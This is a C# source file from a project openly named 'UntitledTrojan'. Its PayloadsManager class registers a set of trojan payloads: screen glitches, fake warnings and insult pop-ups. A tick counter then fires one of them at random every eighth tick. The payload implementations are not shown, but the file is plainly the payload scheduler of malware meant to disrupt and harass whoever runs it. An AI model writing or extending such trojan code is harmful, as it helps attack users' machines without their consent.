using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using UntitledTrojan.Tools;

namespace UntitledTrojan.Payloads
{
    internal static class PayloadsManager
    {
        private static Random random = new Random();
        private static int ticks = 0;
        private static int delay = 8;
        private static int payloadOnTick = 8;
        private static List<Action> payloads = new List<Action>();

        internal static void InitializePayloads()
        {
            // Add all payloads to the list
            payloads.Add(new Action(() => DisplayFuck.StartGlitch(random.Next(500, 2000))));
            payloads.Add(new Action(() => DisplayFuck.StartWarn(random.Next(500, 2000))));
            payloads.Add(new Action(() => Insulting.ShowInsult()));
        }

        internal static void OnTick()
        {
            // Activate a random payload if needed
            ticks++;
            if (ticks == payloadOnTick)
            {
                payloadOnTick += delay;
                int index = random.Next(0, payloads.Count);
                payloads[index].Invoke();
            }
        }
    }
}
